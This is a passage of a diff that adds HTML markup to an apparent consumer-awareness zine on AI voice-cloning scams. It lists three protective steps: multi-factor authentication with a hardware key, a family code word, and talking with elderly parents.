+      <td class="protected">Protected</td>
+      <td class="protected">Protected</td>
+    </tr>
+  </table>
+
+  <div class="section" style="margin-top: 0.3in;">
+    <h2 class="section-title">How to protect yourself</h2>
+    <p class="section-intro">
+      AI can clone voices. It can trick phone verification. It can fool security apps. 
+      But AI cannot clone what you physically are or hold. Three actions to take today:
+    </p>
+  </div>
+
+  <div class="protection-list">
+    <div class="protection-item">
+      <div class="protection-number">1</div>
+      <div class="protection-content">
+        <div class="protection-title">Enable three-factor authentication.</div>
+        <div class="protection-body">Something you know (password) + something you have (smartphone) + something you are (fingerprint or face ID). Use a physical security key like YubiKey when possible.</div>
+        <div class="protection-reason">AI cannot clone your fingerprint or face. Physical keys cannot be replicated.</div>
+      </div>
+    </div>
+    <div class="protection-item">
+      <div class="protection-number">2</div>
+      <div class="protection-content">
+        <div class="protection-title">Pick a family code word.</div>
+        <div class="protection-body">Choose a random phrase. Tell your family: if anyone calls asking for money, they must say this code word first. Hang up and call back on a saved number.</div>
+        <div class="protection-reason">AI can clone voices. It cannot know your secret.</div>
+      </div>
+    </div>
+    <div class="protection-item">
+      <div class="protection-number">3</div>
+      <div class="protection-content">
+        <div class="protection-title">Talk to your parents today.</div>
+        <div class="protection-body">Sit down with them. Explain voice cloning. Show them this zine. Set up biometric authentication and the family code word together.</div>
+        <div class="protection-reason">Elderly people lost $1 billion to AI scams in 2024.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-main">Thank you for reading.</div>
+    <div class="footer-sub">Protect yourself.</div>
+  </div>
+
 </body>
 </html>
-
